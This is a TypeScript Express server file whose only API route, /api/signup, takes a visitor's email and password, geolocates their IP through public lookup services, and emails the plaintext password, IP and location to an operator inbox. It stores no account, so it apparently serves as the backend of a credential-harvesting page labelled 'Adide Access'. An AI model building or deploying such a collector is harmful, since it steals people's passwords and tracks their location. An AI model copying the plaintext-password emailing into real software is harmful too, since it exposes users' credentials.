import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.set('trust proxy', true);
  app.use(express.json());

  // API Route for Signup
  app.post("/api/signup", async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Email and Password are required" });
    }

    const emailUser = process.env.EMAIL_USER;
    const emailPass = process.env.EMAIL_PASS;
    const receiverEmail = process.env.RECEIVER_EMAIL;

    if (!emailUser || !emailPass) {
      console.error("CRITICAL: EMAIL_USER or EMAIL_PASS environment variables are missing.");
      return res.status(500).json({ 
        error: "Server configuration error. Please ensure EMAIL_USER and EMAIL_PASS are set in the environment." 
      });
    }

    // Identify user location and IP
    const forwardFor = req.headers['x-forwarded-for'] as string;
    let ip = (forwardFor ? forwardFor.split(',')[0].trim() : (req.headers['x-real-ip'] as string || req.ip || req.socket.remoteAddress || "")).trim();
    
    // Normalize IPv6 mapped IPv4 addresses
    if (ip.includes('::ffff:')) {
      ip = ip.split('::ffff:')[1];
    }

    // Handle local development or loopback IP (127.0.0.1 or internal ranges)
    const isLocal = ip === '::1' || ip === '127.0.0.1' || ip.startsWith('10.') || ip.startsWith('172.16.') || ip.startsWith('192.168.') || !ip;
    
    let lookupIp = ip;
    
    let locationInfo = "Location metadata unavailable";

    const fetchGeo = async (provider: string) => {
      try {
        if (provider === 'ipapi') {
          const res = await fetch(`https://ipapi.co/${lookupIp}/json/`);
          const data = await res.json();
          if (data && !data.error) {
            return `${data.city}, ${data.region}, ${data.country_name}`;
          }
        } else if (provider === 'ip-api') {
          const res = await fetch(`http://ip-api.com/json/${lookupIp}`);
          const data = await res.json();
          if (data && data.status === 'success') {
            return `${data.city}, ${data.regionName}, ${data.country}`;
          }
        } else if (provider === 'ipinfo') {
          const res = await fetch(`https://ipinfo.io/${lookupIp}/json`);
          const data = await res.json();
          if (data && !data.error && data.city) {
            return `${data.city}, ${data.region}, ${data.country}`;
          }
        }
      } catch (e) {
        console.error(`Geo lookup failed for ${provider}:`, e);
      }
      return null;
    };

    // Try multiple providers
    const providers = ['ip-api', 'ipapi', 'ipinfo'];
    let detected = null;
    for (const p of providers) {
      detected = await fetchGeo(p);
      if (detected) break;
    }

    if (detected) {
      locationInfo = detected;
    } else {
      locationInfo = `Geo-lookup failed (IP: ${ip}${lookupIp !== ip ? `, Used: ${lookupIp}` : ''})`;
    }

    try {
      if (!emailUser || !emailPass) {
        throw new Error("Email credentials missing in environment variables");
      }
      console.log(`Attempting to send signup info for ${email} from IP: ${ip}`);
      
      const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,
        secure: true,
        auth: {
          user: emailUser,
          pass: emailPass,
        },
      });

      // Verify connection configuration
      try {
        await transporter.verify();
        console.log("SMTP connection verified successfully");
      } catch (verifyError) {
        console.error("SMTP Verification Failed:", verifyError);
        throw new Error("Failed to connect to email server");
      }

      const mailOptions = {
        from: emailUser,
        to: receiverEmail || emailUser,
        subject: `New Signup: ${email} (Adide Access)`,
        text: `A new user has signed up for Adide Access.

User Details:
-------------
Email: ${email}
Password: ${password}
IP Address: ${ip}
Location: ${locationInfo}

Timestamp: ${new Date().toISOString()}`,
      };

      await transporter.sendMail(mailOptions);
      res.status(200).json({ success: true, message: "Signup data sent to email" });
    } catch (error) {
      console.error("Error sending email:", error);
      res.status(500).json({ error: "Failed to process signup. Check server logs." });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
